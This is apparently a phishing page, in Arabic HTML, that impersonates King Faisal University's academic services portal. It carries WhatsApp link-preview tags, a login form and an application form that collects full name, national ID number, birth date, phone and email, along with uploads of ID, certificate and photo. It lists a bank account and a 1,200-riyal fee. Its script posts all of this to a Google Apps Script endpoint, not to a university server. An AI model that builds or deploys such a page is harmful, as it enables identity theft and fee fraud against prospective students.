<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<!-- ✅ معاينة الواتساب الرسمية -->
<meta property="og:title" content="جامعة الملك فيصل – بوابة الخدمات الأكاديمية">
<meta property="og:description" content="التقديم الإلكتروني – تسجيل الدخول – الخدمات الأكاديمية للطلاب">
<meta property="og:image" content="https://i.pinimg.com/736x/51/85/7e/51857e7e1a55e654d7c612c5f8ac200c.jpg">
<meta property="og:type" content="website">
<meta name="twitter:card" content="summary_large_image">

<title>بوابة الخدمات الأكاديمية - جامعة الملك فيصل</title>
<link rel="icon" type="image/png" href="kfu_logo.png">
<link rel="stylesheet" href="style.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

</head>
<body>

<!-- ✅ صفحة تسجيل الدخول (بدون تعديل) -->
<div class="login-container">
<header class="login-header">
    <div class="university-logo">
        <div class="logo-circle">
            <img src="kfu_logo.png" alt="شعار جامعة الملك فيصل">
        </div>
        <h1>جامعة الملك فيصل</h1>
        <p>بوابة الخدمات الأكاديمية</p>
    </div>
</header>

<main class="login-form-container">
    <div class="login-form">
        <h2>تسجيل الدخول</h2>

        <form id="loginForm">
            <div class="form-group">
                <label>اسم المستخدم أو الإيميل</label>
                <div class="input-group">
                    <i class="fas fa-user"></i>
                    <input type="text" required>
                </div>
            </div>

            <div class="form-group">
                <label>كلمة المرور</label>
                <div class="input-group">
                    <i class="fas fa-lock"></i>
                    <input type="password" required>
                </div>
            </div>

            <button type="submit" class="login-btn">
                <i class="fas fa-sign-in-alt"></i>
                <span>تسجيل الدخول</span>
            </button>
        </form>

        <!-- ✅ زر فتح نموذج التسجيل -->
        <div class="quick-access">
            <h3>وصول سريع</h3>
            <div class="quick-links">
                <a href="#" class="quick-link" onclick="showForm()">
                    <i class="fas fa-user-graduate"></i>
                    <span>تقديم طلب جديد</span>
                </a>
            </div>
        </div>

    </div>
</main>

<footer class="login-footer">
    <p>© 2025 جامعة الملك فيصل</p>
</footer>
</div>

<!-- ✅ النموذج الكامل (يظهر عند الضغط) -->
<div class="container" id="registrationForm" style="display:none">

<form id="registrationFormForm"
      action="https://script.google.com/macros/s/AKfycbxglQ_oGCF_ICL56X9dofD56F1mF89vIef6NrN7BObysCTEs5xQVfQ9wGc8N4aWwkG2/exec"
      method="POST" enctype="multipart/form-data">

<header>
    <div class="brand">
        <div class="logo">KFU</div>
        <div>
            <h1>نموذج التسجيل - جامعة الملك فيصل</h1>
            <p class="subtitle">يرجى تعبئة جميع الحقول بدقة وإرفاق الملفات المطلوبة.</p>
        </div>
    </div>

    <div>
        <div class="bank-name">رقم الحساب:</div>
        <div style="font-weight:800;color:#0b6b44">SA1980000857608010276380</div>
        <div style="color:#444">الرسوم: 1200 ريال</div>
    </div>
</header>

<!-- ✅ الحقول -->
<div class="grid2">
    <div>
        <label>الاسم الكامل *</label>
        <input type="text" name="fullName" required>

        <label>الجنس *</label>
        <select name="gender" required>
            <option value="">اختر...</option>
            <option>ذكر</option>
            <option>أنثى</option>
        </select>

        <label>الجنسية *</label>
        <select name="nationality" required>
            <option value="">اختر...</option>
            <option>السعودية</option>
            <option>اليمن</option>
            <option>مصر</option>
            <option>العراق</option>
        </select>

        <label>رقم الهوية *</label>
        <input type="text" name="idNumber" required>

        <label>تاريخ الميلاد *</label>
        <input type="date" name="birthDate" required>

        <label>رقم الجوال *</label>
        <input type="tel" name="phone" required>

        <label>البريد الإلكتروني *</label>
        <input type="email" name="email" required>
    </div>

    <div>
        <label>المؤهل السابق *</label>
        <select name="prevDegree" required>
            <option value="">اختر...</option>
            <option>ثانوي</option>
            <option>دبلوم</option>
            <option>بكالوريوس</option>
        </select>

        <label>التخصص المطلوب *</label>
        <input type="text" name="desiredMajor" required>

        <label>نوع الدراسة *</label>
        <select name="studyType" required>
            <option value="">اختر...</option>
            <option>انتظام</option>
            <option>انتساب</option>
            <option>تعليم عن بعد</option>
        </select>

        <label>الكلية *</label>
        <select name="faculty" required>
            <option value="">اختر...</option>
            <option>كلية الطب</option>
            <option>كلية العلوم</option>
            <option>كلية الحاسبات</option>
        </select>
    </div>
</div>

<!-- ✅ المرفقات -->
<div class="section-title">المرفقات</div>
<div class="files-row">
    <div>
        <label>صورة الهوية *</label>
        <input type="file" name="fileId" required>
    </div>
    <div>
        <label>الشهادة *</label>
        <input type="file" name="fileCertificate" required>
    </div>
</div>

<div class="files-row">
    <div>
        <label>صورة شخصية *</label>
        <input type="file" name="filePhoto" required>
    </div>
    <div>
        <label>إيصال الدفع (اختياري)</label>
        <input type="file" name="fileReceipt">
    </div>
</div>

<div class="submit-area">
    <button type="submit" class="btn">إرسال الطلب</button>
    <button type="reset" class="btn cancel">إلغاء</button>
</div>

</form>
</div>

<!-- ✅ السكربت -->
<script>
function showForm(){
    const form = document.getElementById('registrationForm');
    form.style.display = 'block';
    form.scrollIntoView({behavior:"smooth"});
}

document.getElementById("registrationFormForm").addEventListener("submit", e=>{
    e.preventDefault();

    let fd = new FormData(e.target);

    fetch(e.target.action, {method:"POST", body:fd})
    .then(r=>{
        alert("✅ تم إرسال الطلب بنجاح");
        e.target.reset();
    })
    .catch(()=>{
        alert("❌ خطأ! حاول مرة أخرى");
    });
});
</script>

</body>
</html>
